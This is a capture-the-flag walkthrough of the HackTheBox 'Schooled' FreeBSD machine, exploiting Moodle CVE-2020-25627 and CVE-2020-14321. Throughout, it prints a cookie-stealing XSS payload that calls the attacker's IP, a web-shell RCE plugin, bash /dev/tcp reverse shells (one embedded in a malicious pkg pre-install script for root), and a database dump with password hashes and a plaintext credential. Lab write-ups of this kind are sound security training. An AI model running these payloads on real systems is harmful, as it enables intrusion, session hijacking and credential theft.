---
title: "Walk-through of Schooled from HackTHeBox"
header:
  teaser: /assets/images/2021-09-20-22-37-37.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - FreeBSD
  - Gobuster
  - Moodle
  - CVE-2020-25627
  - CVE-2020-14321
  - Hashcat
---

## Machine Information

![schooled](/assets/images/2021-09-20-22-37-37.png)

Schooled is rated as a medium machine on HackTheBox. An initial scan reveals a website running on port 80, and recon of it finds a Moodle site. We use two different CVE to gain access to the underlying server, and from there dump a mysql database to retrieve user credentials. These are cracked to provide SSH access, we then abuse excessive rights to pkg which allows us to escalate privleges to root.

<!--more-->

Skills required are web and OS enumeration, hash cracking knowledge. Skills learned are researching and exploiting vulnerable software. Creating and install malicious packages on FreeBSD.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Schooled](https://www.hackthebox.eu/home/machines/profile/335) |
| Machine Release Date | 3rd April 2021 |
| Date I Completed It | 24th September 2021 |
| Distribution Used | Kali 2021.2 – [Release Info](https://www.kali.org/blog/kali-linux-2021-2-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/schooled]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.234 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/schooled]
└─# nmap -p$ports -sC -sV -oA schooled 10.10.10.234
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 22:42 BST
Nmap scan report for 10.10.10.234
Host is up (0.025s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=9/20%Time=6149003E%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
<SNIP>
SF:\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10
SF:\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

Just a few open ports, let's look at 80 first and see what's running on Apache:

![schooled-web](/assets/images/2021-09-21-21-58-33.png)

It's a school themed site, basic html, no real content other than a few pages of information.

At the bottom we see a domain:

![schooled-domain](/assets/images/2021-09-21-22-02-09.png)

I added that to my hosts file:

```text
┌──(root💀kali)-[~/htb/schooled]
└─# echo "10.10.10.234 schooled.htb" >> /etc/hosts
```

## Gobuster

Then looked around the site again, but no change. I ran gobuster looking for hidden folder and didn't find anything interesting, then tried it again looking for subdomains:

```text
┌──(root💀kali)-[/opt/rustbuster]
└─# gobuster vhost -u http://schooled.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://schooled.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/09/21 21:56:37 Starting gobuster in VHOST enumeration mode
===============================================================
Found: moodle.schooled.htb (Status: 200) [Size: 84]
===============================================================
2021/09/21 21:56:56 Finished
===============================================================
```

We find [Moodle](https://moodle.org/) on a subdomain. This is an open source learning platform, let's add that to our hosts file:

```text
┌──(root💀kali)-[~/htb/schooled]
└─# echo "10.10.10.234 moodle.schooled.htb" >> /etc/hosts
```

## Initial Access

Now let's try the website:

![schooled-moodle](/assets/images/2021-09-21-22-23-24.png)

There's not a lot here, every link redirects me to a login page. I couldn't find a version number anywhere, but looking at the githib site I found this page:

![schooled-upgrade](/assets/images/2021-09-21-22-25-15.png)

Navigating to the equivalent page on this Moodle site I find the version:

```text
This files describes API changes in /admin/*.
=== 3.9 ===
* The following functions, previously used (exclusively) by upgrade steps are not available anymore because of the upgrade cleanup performed for this version. See MDL-65809 for more info:
    - upgrade_fix_block_instance_configuration()
    - upgrade_theme_is_from_family()
    - upgrade_find_theme_location()
    - linkcoursesectionsupgradescriptwasrun setting
    - upgrade_block_positions()
```

I found an exploit on searchsploit but it needs authentication. Giving up for now I have a look at the login page:

![schooled-create-account](/assets/images/2021-09-21-22-29-46.png)

Default credentials, and variations didn't work. I tried to create an account:

![schooled-failed-create](/assets/images/2021-09-21-22-32-03.png)

It failed but reveals there is a student subdomain needed, let's try that:

![schooled-create-success](/assets/images/2021-09-21-22-33-42.png)

That worked. I end up here:

![schooled-cant-enroll](/assets/images/2021-09-21-22-35-11.png)

Going back to courses I find of the four available only Maths let's me enrol:

![schooled-maths](/assets/images/2021-09-21-22-36-05.png)

There's very little here, but in the announcements section I find this post:

![schooled-announcement](/assets/images/2021-09-21-22-40-28.png)

## CVE-2020-25627

Here we find a clue to our next steps. It tells us to set our MoodleNet profile, and that the teacher will be checking. With this being a CTF we can assume there is something scheduled on the box to check. Not knowing anything about Moodle I Googled "moodle moodlenet exploit" and found [this](https://github.com/HoangKien1020/CVE-2020-25627) CVE. It explains how to exploit a XSS vulnerability using the MoodleNet profile setting for a registered user.

Let's test it by editing the user profile and putting something simple in the field like this:

```html
<script>alert("Hello From Pencer")</script>
```

![schooled-edit-profile](/assets/images/2021-09-21-22-45-42.png)

As soon as I click the update profile button at the bottom of the screen I get this pop up:

![schooled-xss](/assets/images/2021-09-21-22-47-36.png)

That worked, so I try the suggested cookie stealing XSS next. Start a web server listening:

```text
┌──(root💀kali)-[~/htb/schooled]
└─# python3 -m http.server 80                                                                                    
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

## Cookie Stealing

Change the XSS to my local Kali IP:

```html
<script>var i=new Image;i.src="http://10.10.14.227/xss.php?"+document.cookie;</script>
```

Enter the above in to the MoodleNet field on the user profile page again and click update. Switch to Kali to see we have captured session cookies:

```text
┌──(root💀kali)-[~/htb/schooled]
└─# python3 -m http.server 80                                                                                    
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.14.227 - - [21/Sep/2021 22:49:40] code 404, message File not found
10.10.14.227 - - [21/Sep/2021 22:49:40] "GET /xss.php?MoodleSession=12obsgldak4hb1bcbbhvig74v9 HTTP/1.1" 404 -
10.10.10.234 - - [21/Sep/2021 22:50:27] code 404, message File not found
10.10.10.234 - - [21/Sep/2021 22:50:27] "GET /xss.php?MoodleSession=er9oiueidahouo2msndua7b91i HTTP/1.1" 404 -
10.10.10.234 - - [21/Sep/2021 22:52:31] code 404, message File not found
10.10.10.234 - - [21/Sep/2021 22:52:31] "GET /xss.php?MoodleSession=aul526ect0noc7f97he3oft497 HTTP/1.1" 404 -
10.10.10.234 - - [21/Sep/2021 22:54:35] code 404, message File not found
10.10.10.234 - - [21/Sep/2021 22:54:35] "GET /xss.php?MoodleSession=bf0gak8g91dh41cgit3fonv4qu HTTP/1.1" 404 -
```

We can take the last cookie and open the dev tools in Firefox, go to Storage Inspecter, on the Cookies section we replace our user cookie with this new one:

![schooled-cookie](/assets/images/2021-09-21-22-55-43.png)

Hit refresh and we are now logged in as the teacher Manuel:

![schooled-teacher](/assets/images/2021-09-21-22-56-31.png)

## CVE-2020-14321

A look around the teacher profile didn't help, but a Google for privilege escalation points me back to the same Github repository, this time for [CVE-2020-14321](https://github.com/HoangKien1020/CVE-2020-14321).
This exploit works by intercepting the enrolment of a new user with manager role on to the Maths course, and changing the ID to Manuel the teacher I'm logged in as. The result is Manuel now has the manager role.

First we look back at the main site to see which teacher is a manager:

![schooled-manager](/assets/images/2021-09-22-21-24-21.png)

We see it's Lianne. Before we enrol her first check what ID Manuel has, you can do this buy going to his profile page and then looking at the URL:

```text
http://moodle.schooled.htb/moodle/user/profile.php?id=24
```

Now we know his ID is 24 we can enrol Lianne by going to the participants page:

![schooled-enroll](/assets/images/2021-09-22-21-29-41.png)

Click the down arrow on the box that pops up to see the list of people who can be added:

![schooled-add-user](/assets/images/2021-09-22-21-30-29.png)

Pick Lianne and set her as a Student. Before clicking the Enrol Users button we need to start Burp to intercept the request, then back to the site and click Enrol, then back to Burp to see what we intercepted:

![schooled-burp](/assets/images/2021-09-22-21-32-10.png)

Now we can send this to Repeater and adjust the parameters before we send them on to the website, as described in the POC we need to change the ID to be Manuel which we know is 24 from above, and we need to change the role to 1 so he becomes manager:

![schooled-repeater](/assets/images/2021-09-22-21-42-54.png)

After forwarding that on if we go back to the site and refresh we see Manuel is now a manager:

![schooled-manager](/assets/images/2021-09-22-21-46-09.png)

We can now view Lianne's profile while she is in our class, and there is a new link which allows us to log in as her:

![schooled-login-as](/assets/images/2021-09-22-21-50-31.png)

Now we are viewing the system as Lianne and have a new link at the bottom on the left called Site Administration. Click that, then User, then under Permissions click Define Rolls:

![schooled-rolls](/assets/images/2021-09-22-21-56-59.png)

Clicking the Manager link takes you to a really long list of settings for this role, lastly we edit the role. We can now follow the guidance from the CVE on Github here, by turning Burp Interceptor back on then clicking Save Changes. The result request gets intercepted:

![schooled-role-change](/assets/images/2021-09-22-22-01-44.png)

Above I've copied the payload from [here](https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions) and pasted it over the top of everything after this first parameter:

```text
sesskey=zVSWPiezOl
```

## Malicious Plugin

Now back on the Site Administration menu I have access to everything:

![schooled-plugins](/assets/images/2021-09-22-22-23-11.png)

Next we can use the plugin provided with the CVE. Download [this](https://github.com/HoangKien1020/Moodle_RCE/raw/master/rce.zip) from Github:

```text
┌──(root💀kali)-[~/htb/schooled]
└─# wget https://github.com/HoangKien1020/Moodle_RCE/raw/master/rce.zip
--2021-09-22 22:25:17--  https://github.com/HoangKien1020/Moodle_RCE/raw/master/rce.zip
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘rce.zip’
rce.zip        [ <=>                                      ] 125.23K  --.-KB/s    in 0.08s   
2021-09-22 22:25:18 (1.47 MB/s) - ‘rce.zip’ saved [128232]
```

Then back in Moodle we click on Install Plugins to get here:

![schooled-install](/assets/images/2021-09-22-22-28-50.png)

Click Choose a file, then browse to the rce.zip file we just downloaded:

![schooled-upload](/assets/images/2021-09-22-22-29-46.png)

After checking we get to this screen:

![schooled-rcs](/assets/images/2021-09-22-22-36-48.png)

Scroll to the bottom and click on Continue. Finally we end up here:

![schooled-rce-installed](/assets/images/2021-09-22-22-38-33.png)

## Web Shell

Now switch to the console to check our web shell is working:

```text
┌──(root💀kali)-[~/htb/schooled]
└─# curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id
uid=80(www) gid=80(www) groups=80(www)
```

## Reverse Shell

Nice, we have remote command execution. Let's start a reverse shell:

```text
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.227/4444 0>&1'
```

We need to URL encode it, then send with a netcat listener waiting in another terminal:

```text
┌──(root💀kali)-[~/htb/schooled]
└─# curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.227%2F4444%200%3E%261%27
```

Switching to netcat we see we are in:

```text
┌──(root💀kali)-[~/htb/schooled]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.227] from (UNKNOWN) [10.10.10.234] 34939
bash: cannot set terminal process group (2026): Can't assign requested address
bash: no job control in this shell
[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ 
```

First thing we need to upgrade to a better shell, python isn't in the path but we can find it easily:

```text
[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ find / -name python* 2>/dev/null
/usr/local/man/man1/python3.7.1.gz
/usr/local/libdata/pkgconfig/python3.pc
/usr/local/libdata/pkgconfig/python-3.7m.pc
/usr/local/libdata/pkgconfig/python-3.7.pc
/usr/local/bin/python3.7m
/usr/local/bin/python3
```

Let's upgrade:

```text
[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ /usr/local/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ ^Z  
zsh: suspended  nc -nlvp 4444
┌──(root💀kali)-[~/htb/schooled]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 4444
[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$
```

## MySQL Enumeration

I didn't find anything from a quick look around, but checking the Moodle docs I then found the config file here:

```text
[www@Schooled /usr/local/www/apache24/data/moodle]$ cat config.php
<?php  // Moodle configuration file
unset($CFG);
global $CFG;
$CFG = new stdClass();
$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8_unicode_ci',
);
```

We have the mysql username and password. First we need to find where mysql is installed as it's not in the default path:

```text
[www@Schooled /usr/local/www/apache24/data/moodle]$ find / -name mysql 2>/dev/null
/usr/local/bin/mysql
```

Now we can use the creds to look around the mysql database:

```text
[www@Schooled /usr/local/www/apache24/data/moodle]$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'show databases;'
+--------------------+
| Database           |
+--------------------+
| information_schema |
| moodle             |
+--------------------+

[www@Schooled /usr/local/www/apache24/data/moodle]$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'show tables from moodle;'
+----------------------------------+
| Tables_in_moodle                 |
+----------------------------------+
| mdl_analytics_indicator_calc     |
<SNIP>
| mdl_url                          |
| mdl_user                         |
| mdl_user_devices                 |
| mdl_user_enrolments              |
| mdl_user_info_category           |
| mdl_user_info_data               |
| mdl_user_info_field              |
| mdl_user_lastaccess              |
| mdl_user_password_history        |
| mdl_user_password_resets         |
| mdl_user_preferences             |
| mdl_user_private_key             |
+----------------------------------+

[www@Schooled /usr/local/www/apache24/data/moodle]$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -D moodle -e 'select username,password,email from mdl_user;'
+-------------------+--------------------------------------------------------------+----------------------------------------+
| username          | password                                                     | email                                  |
+-------------------+--------------------------------------------------------------+----------------------------------------+
| guest             | $2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 | root@localhost                         |
| admin             | $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW | jamie@staff.schooled.htb               |
| bell_oliver89     | $2y$10$N0feGGafBvl.g6LNBKXPVOpkvs8y/axSPyXb46HiFP3C9c42dhvgK | bell_oliver89@student.schooled.htb     |
| orchid_sheila89   | $2y$10$YMsy0e4x4vKq7HxMsDk.OehnmAcc8tFa0lzj5b1Zc8IhqZx03aryC | orchid_sheila89@student.schooled.htb   |
<SNIP>
| carter_lianne     | $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe | carter_lianne@staff.schooled.htb       |
| parker_dan89      | $2y$10$MYvrCS5ykPXX0pjVuCGZOOPxgj.fiQAZXyufW5itreQEc2IB2.OSi | parker_dan89@student.schooled.htb      |
| parker_tim89      | $2y$10$YCYp8F91YdvY2QCg3Cl5r.jzYxMwkwEm/QBGYIs.apyeCeRD7OD6S | parker_tim89@student.schooled.htb      |
| pencer            | $2y$10$0aBqz.0PbaD7cMvbx5cqyOFRyhkxy25aTMpJE.tpAKE.oaDTr91hG | pencer@student.schooled.htb            |
+-------------------+--------------------------------------------------------------+----------------------------------------+
```

So above we found the database name, then looked at the tables in it, then found the user table and looked at username, password and email. From the list we can see Jamie is admin. And we know from looking around earlier that Jamie has an account on the server. So let's take the password hash and see if we can crack it.

## Hash Cracking

First we need to identify it:

```text
┌──(root💀kali)-[~]
└─# pip3 install name-that-hash
Collecting name-that-hash
  Downloading name_that_hash-1.10.0-py3-none-any.whl (29 kB)
Requirement already satisfied: click<9.0.0,>=7.1.2 in /usr/lib/python3/dist-packages (from name-that-hash) (7.1.2)
Collecting rich<11.0,>=9.9
  Downloading rich-10.10.0-py3-none-any.whl (211 kB)
     |████████████████████████████████| 211 kB 1.2 MB/s 
Requirement already satisfied: pygments<3.0.0,>=2.6.0 in /usr/lib/python3/dist-packages (from rich<11.0,>=9.9->name-that-hash) (2.7.1)
Requirement already satisfied: colorama<0.5.0,>=0.4.0 in /usr/lib/python3/dist-packages (from rich<11.0,>=9.9->name-that-hash) (0.4.4)
Collecting commonmark<0.10.0,>=0.9.0
  Downloading commonmark-0.9.1-py2.py3-none-any.whl (51 kB)
     |████████████████████████████████| 51 kB 1.0 MB/s 
Installing collected packages: commonmark, rich, name-that-hash
Successfully installed commonmark-0.9.1 name-that-hash-1.10.0 rich-10.10.0
                                                                             
┌──(root💀kali)-[~]
└─# nth --text $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW 
  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|
https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 

yD/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW

Most Likely 
BigCrypt, JtR: bigcrypt
```

We see it's a bcrypt hash, let's put it in a file and try to crack it with Hashcat:

```text
┌──(root💀kali)-[~]
└─# echo "\$2y\$10\$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW" > admin.hash
```

Find the mode from [here](https://hashcat.net/wiki/doku.php?id=example_hashes):

```text
3200    bcrypt $2*$, Blowfish (Unix)
```

Run hashcat using rockyou wordlist:

```text
┌──(root💀kali)-[~/htb/schooled]
└─# hashcat admin.hash /usr/share/wordlists/rockyou.txt -m 3200
hashcat (v6.1.1) starting...
Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1
Host memory required for this attack: 65 MB
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:<HIDDEN>

Started: Thu Sep 23 22:00:08 2021
Stopped: Thu Sep 23 22:04:06 2021
```

## User Flag

We've found the password for Jamie, so now we can ssh on as him:

```text
┌──(root💀kali)-[~]
└─# ssh jamie@schooled.htb                          
The authenticity of host 'schooled.htb (10.10.10.234)' can't be established.
ECDSA key fingerprint is SHA256:BiWc+ARPWyYTueBR7SHXcDYRuGsJ60y1fPuKakCZYDc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'schooled.htb,10.10.10.234' (ECDSA) to the list of known hosts.
Password for jamie@Schooled:
Last login: Tue Mar 16 14:44:53 2021 from 10.10.14.5
FreeBSD 13.0-BETA3 (GENERIC) #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021
jamie@Schooled:~ $
```

Let's get the user flag before we look further:

```text
jamie@Schooled:~ $ cat /home/jamie/user.txt 
<HIDDEN>
```

One of the first things I tried after that was sudo privleges:

```text
jamie@Schooled:~ $ sudo -l

User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```

## Package Exploit

That was easy. We see straight away that we can install packages as root. GTFOBins has an article [here](https://gtfobins.github.io/gtfobins/pkg/) on how to exploit this.

If using Kali you first need to install fpm from [here](https://github.com/jordansissel/fpm):

```text
┌──(root💀kali)-[~/htb/schooled]
└─# git clone https://github.com/jordansissel/fpm.git
Cloning into 'fpm'...
remote: Enumerating objects: 13589, done.
remote: Counting objects: 100% (399/399), done.
remote: Compressing objects: 100% (198/198), done.
remote: Total 13589 (delta 224), reused 325 (delta 197), pack-reused 13190
Receiving objects: 100% (13589/13589), 2.66 MiB | 3.50 MiB/s, done.
Resolving deltas: 100% (6507/6507), done.

┌──(root💀kali)-[~/htb/schooled/fpm]
└─# gem install fpm                                  
Fetching mustache-0.99.8.gem
Fetching insist-1.0.0.gem
Fetching dotenv-2.7.6.gem
Fetching clamp-1.0.1.gem
<SNIP>
Done installing documentation for stud, mustache, insist, dotenv, clamp, cabin, pleaserun, git, backports, arr-pm, fpm after 6 seconds
11 gems installed
```

Following the GTFOBins post we create our malicious package. If it works when installed on the box we should see the id command runs as root:

```text
┌──(root💀kali)-[~/htb/schooled/fpm]
└─# TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
Created package {:path=>"x-1.0.txz"}
```

Then SCP over to the box:

```text
┌──(root💀kali)-[~/htb/schooled/fpm]
└─# scp x-1.0.txz jamie@10.10.10.234:/tmp/
Password for jamie@Schooled:
x-1.0.txz       100%  480    22.8KB/s   00:00
```

Switching to the schooled server we can now install our package as root:

```text
jamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. 'pkg update' required
pkg: No packages available to install matching './x-1.0.txz' have been found in the repositories
jamie@Schooled:~ $ sudo pkg install -y --no-repo-update /tmp/x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. 'pkg update' required
Checking integrity... done (0 conflicting)
The following 1 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:
        x: 1.0

Number of packages to be installed: 1
[1/1] Installing x-1.0...
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
Extracting x-1.0:   0%
pkg: File //tmp/tmp.jpowA3ywDS/x.sh not specified in the manifest
Extracting x-1.0: 100%
```

Above we can see our test worked and the id command ran as root:

```text
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
```

Back to Kali and let's create a new package, this time with a reverse shell:

```text
┌──(root💀kali)-[~/htb/schooled/fpm]
└─# TF=$(mktemp -d)
echo "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.227/4444 0>&1'" > $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
Created package {:path=>"x-1.0.txz"}
```

SCP this one over to the box:

```text
┌──(root💀kali)-[~/htb/schooled/fpm]
└─# scp x-1.0.txz jamie@10.10.10.234:/tmp/                                               
Password for jamie@Schooled:
x-1.0.txz             100%  520    26.1KB/s   00:00
```

Start a netcat listener on Kali, then switch back across to schooled and install our package:

```text
jamie@Schooled:~ $ sudo pkg install -y --no-repo-update /tmp/x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. 'pkg update' required
Checking integrity... done (0 conflicting)
The following 1 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:
        x: 1.0

Number of packages to be installed: 1
[1/1] Installing x-1.0...
```

## Root Flag

We see the install hangs at the point our shell is executed. Switch to our waiting netcat listener to see we have a root shell:

```text
┌──(root💀kali)-[~/htb/schooled/fpm]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.227] from (UNKNOWN) [10.10.10.234] 38117
[root@Schooled /usr/home/jamie]# id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
```

Grab the flag at last:

```text
[root@Schooled /usr/home/jamie]# cat /root/root.txt
<HIDDEN>
```

That was a fun box. I hope you learned something new, and thanks to [TheCyberGeek](https://twitter.com/TheCyberGeek19) for creating it.

See you next time.
